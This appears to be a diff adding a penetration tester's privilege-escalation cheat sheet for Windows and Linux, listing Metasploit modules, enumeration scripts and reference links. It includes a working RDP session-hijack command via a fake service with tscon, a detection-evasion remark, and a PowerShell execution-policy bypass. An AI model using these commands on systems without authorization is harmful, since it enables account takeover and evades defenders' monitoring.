@@ -1,0 +1,61 @@
+Windows
+
+	Metasploit
+		getsystem
+
+		multi/recon/local_exploit_suggester
+			background current session first
+
+
+	local admin to domain admin by service creation
+		if DA account logged in but admin is disconnected from RDP 
+
+		query user
+		sc create <fake service name> binpath= "cmd.exe /k tscon <user ID from query user> /dest:rdp-tcp#<matching sessionname from query user>"
+
+		EDR won't detect - must look at Windows Events 4688 (process execution) and/or 7045 (service created)
+
+		NOTE: leaves service on the system
+		sc delete <fake service name>
+
+	winpeas
+
+
+	Sherlock
+		https://github.com/rasta-mouse/Sherlock
+		powershell.exe -exec bypass -Command "& {Import-Module .\sherlock.ps1; Find-AllVulns}"
+
+
+	Watson
+		https://github.com/rasta-mouse/Watson
+
+
+	Windows Exploit Suggester
+		https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
+
+
+
+
+	http://www.fuzzysecurity.com/tutorials/16.html
+
+Linux
+
+	Metasploit
+		getsystem
+
+		multi/recon/local_exploit_suggester
+			background current session first
+
+
+	linpeas
+
+
+	linEnum.sh
+
+
+	linprivchecker.py
+
+
+	https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
